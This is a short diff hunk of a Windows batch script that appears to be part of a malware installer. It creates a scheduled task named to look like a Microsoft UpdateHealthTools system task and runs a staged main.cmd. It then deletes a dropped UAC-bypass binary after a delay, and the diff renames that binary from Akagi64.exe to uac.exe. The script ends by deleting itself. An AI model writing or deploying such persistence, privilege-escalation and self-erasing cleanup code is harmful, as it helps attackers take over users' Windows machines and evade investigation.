@@ -12,6 +12,6 @@ schtasks /create /tn "\Microsoft\Windows\UpdateHealthTools" /tr "C:\Windows\Syst
 
 call "%STAGE%\main.cmd"
 
-start "" /b cmd /c "ping -n 11 127.0.0.1 >nul & del /f /q ""%TEMP%\Akagi64.exe"""
+start "" /b cmd /c "ping -n 11 127.0.0.1 >nul & del /f /q ""%TEMP%\uac.exe"""
 
 (goto) 2>nul & del "%~f0"
